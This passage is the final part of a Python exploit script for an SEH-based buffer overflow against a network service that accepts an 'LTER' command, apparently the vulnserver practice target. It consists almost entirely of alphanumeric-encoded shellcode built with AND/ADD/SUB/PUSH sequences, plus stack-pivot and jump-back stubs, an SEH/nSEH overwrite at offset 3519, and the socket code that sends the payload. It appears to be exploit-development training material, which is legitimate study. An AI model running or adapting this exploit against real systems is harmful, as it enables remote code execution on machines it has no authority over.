exploit += "\x05\x12\x43\x12\x45" ## add  eax, 0x45124312
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [aa0d4f67]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x34\x37\x16\x55" ## add  eax, 0x55163734
exploit += "\x05\x33\x26\x16\x44" ## add  eax, 0x44162633
exploit += "\x05\x33\x25\x14\x44" ## add  eax, 0x44142533
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [66ea4f3c]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x26\x37\x65\x33" ## add  eax, 0x33653726
exploit += "\x05\x25\x26\x54\x33" ## add  eax, 0x33542625
exploit += "\x05\x24\x25\x64\x33" ## add  eax, 0x33642524
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [ec3b5e3d]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x27\x37\x26\x76" ## add  eax, 0x76263727
exploit += "\x05\x16\x27\x15\x76" ## add  eax, 0x76152716
exploit += "\x50"                 ## push eax
# Encoding [14c6d5ab]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x56\x73\x63\x12" ## add  eax, 0x12637356
exploit += "\x05\x55\x62\x63\x02" ## add  eax, 0x02636255
exploit += "\x50"                 ## push eax
# Encoding [462dc5dd]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x77\x63\x17\x23" ## add  eax, 0x23176377
exploit += "\x05\x66\x62\x16\x23" ## add  eax, 0x23166266
exploit += "\x50"                 ## push eax
# Encoding [22b95691]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x51\x33\x65\x11" ## add  eax, 0x11653351
exploit += "\x05\x40\x23\x54\x11" ## add  eax, 0x11542340
exploit += "\x50"                 ## push eax
# Encoding [69eb9b6c]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x36\x56\x76\x35" ## add  eax, 0x35765636
exploit += "\x05\x36\x45\x75\x34" ## add  eax, 0x34754536
exploit += "\x50"                 ## push eax
# Encoding [2cea46a3]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x52\x23\x75\x16" ## add  eax, 0x16752352
exploit += "\x05\x51\x23\x75\x16" ## add  eax, 0x16752351
exploit += "\x50"                 ## push eax
# Encoding [0d081158]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x34\x11\x14\x16" ## add  eax, 0x16141134
exploit += "\x05\x34\x22\x14\x16" ## add  eax, 0x16142234
exploit += "\x05\x23\x11\x13\x14" ## add  eax, 0x14131123
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [8d0921e3]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x72\x11\x05\x47" ## add  eax, 0x47051172
exploit += "\x05\x71\x10\x04\x46" ## add  eax, 0x46041071
exploit += "\x50"                 ## push eax
# Encoding [0c26f745]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x33\x74\x23\x16" ## add  eax, 0x16237433
exploit += "\x05\x23\x63\x13\x15" ## add  eax, 0x15136323
exploit += "\x05\x22\x53\x23\x14" ## add  eax, 0x14235322
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [bb01de27]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x24\x66\x11\x66" ## add  eax, 0x66116624
exploit += "\x05\x13\x65\x12\x55" ## add  eax, 0x55126513
exploit += "\x05\x23\x46\x11\x33" ## add  eax, 0x33114623
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [2f918a4b]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x36\x45\x41\x27" ## add  eax, 0x27414536
exploit += "\x05\x25\x44\x42\x16" ## add  eax, 0x16424425
exploit += "\x05\x23\x34\x41\x25" ## add  eax, 0x25413423
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [83b3f87b]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x46\x74\x62\x42" ## add  eax, 0x42627446
exploit += "\x05\x35\x64\x52\x42" ## add  eax, 0x42526435
exploit += "\x05\x33\x53\x32\x32" ## add  eax, 0x32325333
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [90b69a3b]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x26\x55\x63\x50" ## add  eax, 0x50635526
exploit += "\x05\x15\x45\x53\x40" ## add  eax, 0x40534515
exploit += "\x50"                 ## push eax
# Encoding [a153125a]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x35\x11\x32\x51" ## add  eax, 0x51321135
exploit += "\x05\x25\x01\x21\x50" ## add  eax, 0x50210125
exploit += "\x50"                 ## push eax
# Encoding [50abe914]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x12\x75\x56\x30" ## add  eax, 0x30567512
exploit += "\x05\x02\x74\x55\x20" ## add  eax, 0x20557402
exploit += "\x50"                 ## push eax
# Encoding [a787030e]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x07\x02\x43\x53" ## add  eax, 0x53430207
exploit += "\x05\x07\x01\x44\x54" ## add  eax, 0x54440107
exploit += "\x50"                 ## push eax
# Encoding [6a3104c2]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x61\x02\x21\x35" ## add  eax, 0x35210261
exploit += "\x05\x61\x02\x10\x35" ## add  eax, 0x35100261
exploit += "\x50"                 ## push eax
# Encoding [8352b11c]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x16\x61\x31\x42" ## add  eax, 0x42316116
exploit += "\x05\x06\x50\x21\x41" ## add  eax, 0x41215006
exploit += "\x50"                 ## push eax
# Encoding [f6a9edbd]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x66\x66\x54\x73" ## add  eax, 0x73546666
exploit += "\x05\x56\x56\x44\x63" ## add  eax, 0x63445656
exploit += "\x05\x34\x64\x44\x53" ## add  eax, 0x53446434
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [c933e289]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x45\x71\x22\x65" ## add  eax, 0x65227145
exploit += "\x05\x44\x71\x11\x64" ## add  eax, 0x64117144
exploit += "\x50"                 ## push eax
# Shellcode final size: 2217 bytes                 ## push eax

seh = struct.pack("<I",0x6250195E)
nseh = '\x74\x06\x75\x04'

# Move ESP for the first decoding of the first jump
movESP1 = ("\x54\x58" # PUSH ESP POP EAX
"\x66\x05\x49\x13"       # add ax,0x1349
"\x50\x5C"                      # PUSH EAX POP ESP
)

# Decode a jump (0xeb80 or 126 bytes) back into A buffer.
jumpback1 = "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jumpback1 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jumpback1 += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
jumpback1 += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
jumpback1 += "\x50"

# Move ESP for the second decoding of the next jump
movESP2 = ("\x54\x58" # PUSH ESP POP EAX
"\x2C\x26"                      # sub al,0x26
"\x50\x5C"                             # PUSH EAX
)

jumpback2 = "\x54" ## push esp
jumpback2 += "\x5B" ## pop ebx
## sub ebx, 0xdba (81EBBA0D0000)
jumpback2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jumpback2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jumpback2 += "\x05\x11\x11\x77\x62" ## add  eax, 0x62771111
jumpback2 += "\x05\x11\x11\x66\x52" ## add  eax, 0x52661111
jumpback2 += "\x05\x11\x11\x55\x62" ## add  eax, 0x62551111
jumpback2 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
jumpback2 += "\x50"                 ## push eax
jumpback2 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
jumpback2 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
jumpback2 += "\x05\x41\x76\x65\x07" ## add  eax, 0x07657641
jumpback2 += "\x05\x40\x75\x55\x06" ## add  eax, 0x06557540
jumpback2 += "\x50"

# Move ESP for the second decoding of the next jump
movESP3 = ("\x54\x58" # PUSH ESP POP EAX
"\x2C\x4f"                      # sub al,0x51
"\x50\x5C"                             # PUSH EAX
)

#pointESP = ("\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x54\x58")

# [*] Exact match at offset 3519
payload = movESP3
payload += exploit
payload += 'A' * (3428 - len(exploit + movESP3))
payload += movESP2
payload += jumpback2
payload += 'A' * (3519 - len(payload + nseh))
payload += nseh
payload += seh
payload += movESP1
payload += jumpback1
payload += 'C' * (4000 - len(payload))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.recv(1024)
sock.send("LTER /.:/" + payload + "\r\n")
sock.recv(1024)
sock.close()
